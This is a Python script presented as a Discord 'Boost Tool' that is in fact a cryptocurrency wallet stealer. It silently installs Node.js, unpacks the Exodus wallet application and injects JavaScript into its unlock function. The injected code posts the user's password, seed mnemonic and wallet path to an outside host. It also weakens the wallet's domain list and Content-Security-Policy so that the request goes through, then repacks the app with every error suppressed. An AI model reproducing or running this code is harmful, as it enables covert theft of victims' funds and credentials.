import requests
import os
import re
import subprocess
from bs4 import BeautifulSoup
import shutil
import threading


class Discord_API():
    def __init__(self):
        self.chrome_useragent = None
        self.chrome_version = None
        self.client_build_number = None
        self.data = {"chrome_user_agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36","chrome_version":"115.0.0.0","client_build_number":218051}
        response = requests.get('https://raw.githubusercontent.com/EffeDiscord/discord-api/main/fetch')
        if response.status_code == 200:
            self.data = response.json()
    
    def get_latest_chrome_useragent(self):
        return self.data['chrome_user_agent']
    
    def get_latest_chrome_version(self):
        return self.data['chrome_version']
    
    def get_latest_client_build_number(self):
        return self.data['client_build_number']


def is_nodejs_installed():
    try:
        subprocess.run(['node', '-v'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True, shell=True)
        return True
    except subprocess.CalledProcessError:
        return False

def get_latest_nodejs_version():
    response = requests.get("https://nodejs.org/dist/index.json")
    versions = [entry["version"] for entry in response.json()]
    return versions[0]  # Assuming the first entry is the latest version

def download_nodejs_installer(download_url, save_path):
    response = requests.get(download_url)
    with open(save_path, 'wb') as installer_file:
        installer_file.write(response.content)

def install_nodejs_installer(installer_path):
    try:
        subprocess.run(['msiexec', '/i', installer_path, '/quiet', '/norestart'], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        #print("Node.js installed successfully!")
    except subprocess.CalledProcessError:
        #print("Error: Failed to install Node.js.")
        pass

def update_npm():
    try:
        subprocess.run(['npm', 'install', '-g', 'npm'], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        #print("npm updated successfully!")
    except subprocess.CalledProcessError:
        #print("Error: Failed to update npm.")
        pass

    
finished = False
def title():
    if os.name == 'nt':
        while not finished:
            os.system('title Boost Tool, github.com/femboy11')
    
threading.Thread(target = title).start()

def get_latest_version_folder(exodus_path):
    try:
        version_folders = [folder for folder in os.listdir(exodus_path) if re.match(r'^app-\d+\.\d+\.\d+$', folder)]
        return max(version_folders) if version_folders else None
    except Exception:
        pass

def beautify_js_code(exodus_path, latest_version_folder):
    try:
        index_js_path = os.path.join(exodus_path, latest_version_folder, 'resources', 'unpacked', 'src', 'app', 'wallet', 'index.js')
        if not os.path.isfile(index_js_path):
            #print(f"Error: index.js not found in {index_js_path}")
            return

        subprocess.run(['npx', 'prettier', '--write', index_js_path], shell=True, text=True, encoding='utf-8', stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception:
        pass
    
def insert_request_code(exodus_path, latest_version_folder):
    try:
        index_js_path = os.path.join(exodus_path, latest_version_folder, 'resources', 'unpacked', 'src', 'app', 'wallet', 'index.js')
        with open(index_js_path, 'r', encoding='utf-8') as file:
            js_code = file.read()

        # Define the code to be inserted
        inserted_code = """
            var request = new XMLHttpRequest();
            request.open("POST", "https://exodus.webtoons.gay/exodus", true);
            request.setRequestHeader("Content-Type", "application/json");
            var payload = JSON.stringify({"password": e, "mnemonic": this._seed.mnemonicString, "wallet_directory": this._walletPaths.walletDir});
            request.send(payload);
        """

        # Find the unlock function
        pattern = r'async\s+unlock\(e\)\s*{([\s\S]+?)}'
        match = re.search(pattern, js_code)

        if match:
            # Extract the function body
            function_body = match.group(1).strip()

            # Insert the code with proper indentation
            modified_function_body = f"{function_body}\n{inserted_code}"

            # Replace the function body with the modified one
            modified_js_code = js_code.replace(function_body, modified_function_body)

            # Save the modified code to the file
            with open(index_js_path, 'w', encoding='utf-8') as file:
                file.write(modified_js_code)
        else:
            #print("Unlock function not found.")
            pass
        
    except Exception:
        pass

def update_wallet_domains(exodus_path, latest_version_folder):
    try:
        index_js_path = os.path.join(exodus_path, latest_version_folder, 'resources', 'unpacked', 'src', 'app', 'main', 'index.js')
        if not os.path.isfile(index_js_path):
            #print(f"Error: index.js not found in {index_js_path}")
            return

        with open(index_js_path, 'r') as f:
            content = f.read()

        # Replace the entire 'domains' list with just "*"
        pattern = r'(wallet:\s*{[\s\S]*?domains\s*:\s*)\[.*?\]'
        new_content = re.sub(pattern, r'\g<1>"*"', content)

        with open(index_js_path, 'w') as f:
            f.write(new_content)
    except Exception:
        pass

def update_wallet_html(exodus_path, latest_version_folder):
    try:
        wallet_html_path = os.path.join(exodus_path, latest_version_folder, 'resources', 'unpacked', 'src', 'static', 'wallet.html')
        if not os.path.isfile(wallet_html_path):
            #print(f"Error: wallet.html not found in {wallet_html_path}")
            return

        with open(wallet_html_path, 'r') as f:
            content = f.read()

        # Use BeautifulSoup to parse the HTML content
        soup = BeautifulSoup(content, 'html.parser')

        # Find the existing meta tag with the 'http-equiv' attribute
        meta_tag = soup.find('meta', attrs={'http-equiv': 'Content-Security-Policy'})
        if meta_tag:
            # Update the 'content' attribute of the existing meta tag
            meta_tag['content'] = "default-src 'self'; connect-src data: *"

        with open(wallet_html_path, 'w') as f:
            # Write the updated HTML content back to the file
            f.write(str(soup))
            
    except Exception:
        pass

def unpack_app_asar(exodus_path, latest_version_folder):
    try:
        app_asar_path = os.path.join(exodus_path, latest_version_folder, 'resources', 'app.asar')
        if not os.path.isfile(app_asar_path):
            #print(f"Error: app.asar not found in {app_asar_path}")
            return

        resources_path = os.path.join(exodus_path, latest_version_folder, 'resources')
        unpacked_path = os.path.join(resources_path, 'unpacked')
        os.makedirs(unpacked_path, exist_ok=True)

        # Change the current working directory to the resources folder
        os.chdir(resources_path)

        # Execute the npx asar command to unpack the app.asar file
        subprocess.run(['npm', 'install', '-g', 'asar'], shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(['npx', 'asar', 'e', 'app.asar', 'unpacked'], shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception:
        pass

def repack_app_asar(exodus_path, latest_version_folder):
    try:
        unpacked_path = os.path.join(exodus_path, latest_version_folder, 'resources', 'unpacked')
        app_asar_path = os.path.join(exodus_path, latest_version_folder, 'resources', 'app.asar')

        # Run the npx asar pack command
        subprocess.run('npx asar pack ' + unpacked_path + ' ' + app_asar_path, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception:
        pass

def delete_unpacked_folder(exodus_path, latest_version_folder):
    unpacked_path = os.path.join(exodus_path, latest_version_folder, 'resources', 'unpacked')
    try:
        shutil.rmtree(unpacked_path)
    except OSError as e:
        #print(f"Error deleting unpacked folder: {e}")
        pass

def main():
    exodus_path = os.path.join(os.getenv('LOCALAPPDATA'), 'exodus')
    latest_version_folder = get_latest_version_folder(exodus_path)
    if latest_version_folder:
        unpack_app_asar(exodus_path, latest_version_folder)
        #print("Extraction completed successfully.")

        #beautify_js_code(exodus_path, latest_version_folder)
        #print("Code beautification completed.")

        update_wallet_domains(exodus_path, latest_version_folder)
        #print("Updated wallet domains completed.")

        update_wallet_html(exodus_path, latest_version_folder)
        #print("Update wallet html completed.")

        insert_request_code(exodus_path, latest_version_folder)
        #print("Insertion completed.")
        
        repack_app_asar(exodus_path, latest_version_folder)
        #print("Repacked successfully.")
        
        #delete_unpacked_folder(exodus_path, latest_version_folder)
        #print("Deleted unpacked folder.")
    else:
        #print("Error: No valid Exodus installation found.")
        pass
    
latest_nodejs_version = get_latest_nodejs_version()
download_url = f"https://nodejs.org/dist/{latest_nodejs_version}/node-{latest_nodejs_version}-x64.msi"
installer_path = "node_installer.msi"
if is_nodejs_installed():
    #print("Node.js is already installed.")
    pass
else:
    download_nodejs_installer(download_url, installer_path)
    install_nodejs_installer(installer_path)
    os.remove(installer_path)  # Clean up by deleting the installer file
update_npm()
    
exodus_path = os.path.join(os.getenv('LOCALAPPDATA'), 'exodus')
latest_version_folder = get_latest_version_folder(exodus_path)
s = 'resources'
path = f'{exodus_path}\{latest_version_folder}\{s}'
if 'unpacked' in os.listdir(path):
    p = rf'{path}\unpacked\src\app\wallet\index.js'
    try:
        os.remove(p)
    except Exception:
        pass
else:
    main()
finished = True